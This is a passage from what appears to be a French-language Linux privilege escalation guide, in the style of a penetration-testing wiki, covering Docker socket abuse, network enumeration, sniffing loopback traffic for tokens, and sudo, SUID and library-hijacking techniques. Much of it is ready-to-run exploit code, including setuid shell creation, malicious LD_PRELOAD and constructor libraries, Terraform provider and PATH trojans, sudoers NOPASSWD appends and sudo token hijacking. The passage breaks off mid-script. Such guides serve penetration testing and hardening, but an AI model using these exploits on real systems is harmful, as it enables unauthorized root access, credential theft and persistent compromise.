Notez qu'il peut y avoir des **sockets listening for HTTP** requests (_je ne parle pas des fichiers .socket mais des fichiers agissant comme unix sockets_). Vous pouvez vérifier cela avec:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond à une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploit some vulnerability**.

### Socket Docker accessible en écriture

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est inscriptible par l'utilisateur `root` et les membres du groupe `docker`. Posséder un accès en écriture à ce socket peut conduire à privilege escalation. Voici un aperçu de la manière dont cela peut être réalisé et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Privilege Escalation avec Docker CLI**

Si vous avez un accès en écriture au socket Docker, vous pouvez escalate privileges en utilisant les commandes suivantes :
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d'exécuter un conteneur avec un accès root au système de fichiers de l'hôte.

#### **Utilisation directe de l'API Docker**

Dans les cas où le CLI Docker n'est pas disponible, le socket Docker peut encore être manipulé en utilisant l'API Docker et des commandes `curl`.

1.  **Lister les images Docker :** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Créer un conteneur :** Envoyer une requête pour créer un conteneur qui monte le répertoire racine du système hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le conteneur nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attacher au conteneur :** Utiliser `socat` pour établir une connexion au conteneur, permettant l'exécution de commandes à l'intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir établi la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès root au système de fichiers de l'hôte.

### Autres

Notez que si vous avez des permissions d'écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si l'[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **more ways to break out from containers or abuse container runtimes to escalate privileges** dans :


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir et de partager des données de manière efficace. Conçu pour les systèmes Linux modernes, il offre un cadre robuste pour différentes formes de communication entre applications.

Le système est polyvalent, prenant en charge une IPC de base qui améliore l'échange de données entre processus, rappelant **les sockets de domaine UNIX améliorés**. De plus, il facilite la diffusion d'événements ou de signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal d'un démon Bluetooth concernant un appel entrant peut pousser un lecteur musical à se mettre en sourdine, améliorant l'expérience utilisateur. En outre, D-Bus prend en charge un système d'objets distants, simplifiant les requêtes de services et les invocations de méthodes entre applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne sur un **modèle allow/deny**, gérant les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l'effet cumulatif des règles de politique correspondantes. Ces politiques spécifient les interactions avec le bus, pouvant potentiellement permettre une privilege escalation via l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l'utilisateur root pour posséder, d'envoyer vers, et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "default" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment enumerate et exploit une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d'enumerate le réseau et de déterminer la position de la machine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapide du filtrage sortant

Si l'hôte peut exécuter des commandes mais que les callbacks échouent, séparez rapidement le filtrage DNS, transport, proxy et de routage :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classer les listeners par bind target:

- `0.0.0.0` / `[::]`: exposé sur toutes les interfaces locales.
- `127.0.0.1` / `::1`: local uniquement (good tunnel/forward candidates).
- Adresses IP internes spécifiques (p.ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): généralement accessibles uniquement depuis des segments internes.

### Workflow de triage pour services locaux uniquement

Quand vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un workflow local rapide est :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

En plus des PE checks locaux, linPEAS peut fonctionner comme un scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (typiquement `fping`, `ping`, `nc`, `ncat`) et n'installe aucun outil.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p`, ou `-i` sans `-t`, linPEAS se comporte comme un simple scanner réseau (en sautant le reste des privilege-escalation checks).

### Sniffing

Vérifiez si vous pouvez sniff traffic. Si c'est le cas, vous pourriez être en mesure de grab credentials.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) est particulièrement précieux en post-exploitation car de nombreux services accessibles uniquement en interne exposent des tokens/cookies/credentials sur cette interface :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capturer maintenant, analyser plus tard :
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **login** et lesquels ont **root privileges** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID élevé

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs ayant **UID > INT_MAX** d'escalader les privilèges. Plus d'infos : [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder des privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique des mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter en tant que chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de brute-force des utilisateurs en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` tente également de brute-force les utilisateurs.

## Abus du $PATH inscriptible

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d'escalader les privilèges en **créant une backdoor dans le dossier inscriptible** portant le nom d'une commande qui va être exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Vous pourriez être autorisé à exécuter certaines commandes en utilisant sudo ou elles pourraient avoir le bit suid. Vérifiez-le en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues vous permettent de lire et/ou d'écrire des fichiers ou même d'exécuter une commande.** Par exemple:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration Sudo peut permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root` ; il est alors trivial d'obtenir un shell en ajoutant une ssh key dans le répertoire `root` ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** à **PYTHONPATH hijacking** permettant de charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV conservé via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Pourquoi ça fonctionne : Pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. De nombreuses règles sudo permettent d'exécuter un script ou un wrapper shell. Si `BASH_ENV` est conservé par sudo, votre fichier est sourcé avec les privilèges root.

- Prérequis :
- Une règle sudo que vous pouvez exécuter (n'importe quelle cible qui invoque `/bin/bash` de manière non interactive, ou n'importe quel script bash).
- `BASH_ENV` présent dans `env_keep` (vérifier avec `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement:
- Retirer `BASH_ENV` (et `ENV`) de `env_keep`, préférer `env_reset`.
- Éviter les wrappers shell pour les commandes autorisées par sudo ; utiliser des binaires minimaux.
- Envisager la journalisation I/O de sudo et des alertes lorsque des variables d'environnement préservées sont utilisées.

### Terraform via sudo with preserved HOME (!env_reset)

Si sudo laisse l'environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l'utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.

- Pointez le provider requis vers un répertoire inscriptible et déposez un plugin malveillant nommé d'après le provider (p.ex., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échoue lors du handshake du plugin Go mais exécute la payload en tant que root avant de se terminer, laissant derrière un shell SUID.

### TF_VAR overrides + symlink validation bypass

Les variables Terraform peuvent être fournies via des variables d'environnement `TF_VAR_<name>`, qui survivent lorsque sudo préserve l'environnement. Des validations faibles telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le symlink et copie le vrai `/root/root.txt` dans une destination lisible par l'attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en pré-créant des symlinks de destination (par ex., en pointant le chemin de destination du provider à l'intérieur de `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à s'exécuter uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou si l'option est absente), sudo peut être exécuté depuis des contextes non interactifs tels que des reverse shells, des cron jobs, ou des scripts.
```bash
Defaults !requiretty
```
Ce n'est pas une vulnérabilité directe en soi, mais cela étend les situations dans lesquelles les règles sudo peuvent être abusées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées modifiables par un attaquant (par ex. `/home/<user>/bin`), toute commande relative à l'intérieur de la cible autorisée par sudo peut être masquée.

- Exigences : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée PATH modifiable en écriture qui est recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo : contournement de l'exécution via des chemins
**Jump** pour lire d'autres fichiers ou utiliser **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans spécifier le chemin**: _hacker10 ALL= (root) less_ vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut aussi être utilisée si un binaire **suid** **exécute une autre commande sans préciser le chemin (vérifiez toujours avec** _**strings**_ **le contenu d'un binaire SUID étrange)**).

[Exemples de payloads à exécuter.](payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** **exécute une autre commande en précisant le chemin**, vous pouvez essayer de **exporter une fonction** portant le nom de la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### Script inscriptible exécuté par un SUID wrapper

Une mauvaise configuration courante d'une application personnalisée est un wrapper binaire SUID appartenant à root qui exécute un script, alors que le script lui-même est inscriptible par des utilisateurs à faible privilèges.

Schéma typique:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez y ajouter des commandes payload puis exécuter le SUID wrapper :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (fichiers .so) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé préchargement d'une bibliothèque.

Cependant, pour maintenir la sécurité du système et empêcher l'exploitation de cette fonctionnalité, en particulier avec les exécutables **suid/sgid**, le système impose certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont le real user ID (_ruid_) ne correspond pas à l'effective user ID (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans des chemins standards et elles-mêmes suid/sgid sont préchargées.

Privilege escalation peut survenir si vous avez la possibilité d'exécuter des commandes avec `sudo` et que la sortie de `sudo -l` contient la directive **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être prise en compte même lorsque les commandes sont exécutées avec `sudo`, ce qui peut conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrez sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite **compilez-le** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalader les privilèges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Une privesc similaire peut être exploitée si l'attaquant contrôle la **LD_LIBRARY_PATH** env variable car il contrôle le chemin où les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Lorsqu'on rencontre un binaire avec les permissions **SUID** qui semble inhabituel, il est conseillé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère un potentiel d'exploitation.

Pour exploiter cela, on procéderait en créant un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci‑dessus en un fichier objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l'exécution du binaire SUID affecté devrait déclencher l'exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID qui charge une library depuis un folder où nous pouvons écrire, créons la library dans ce folder avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet recense des fonctions légitimes de binaires Unix qui peuvent être détournées pour sortir de shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter d'autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend **les sudo tokens éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d'écriture** sur le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un jeton sudo pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous disposez d'un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers situés dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure **d'obtenir des informations intéressantes**, et si vous pouvez **écrire** n'importe quel fichier, vous pourrez **obtenir une élévation de privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'abuser de ces autorisations :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe quelques alternatives au binaire `sudo`, comme `doas` pour OpenBSD ; pensez à vérifier sa configuration dans `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader ses privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que, lorsque l'utilisateur exécute sudo, votre exécutable sudo soit lancé.

Notez que si l'utilisateur utilise un autre shell (pas bash) vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
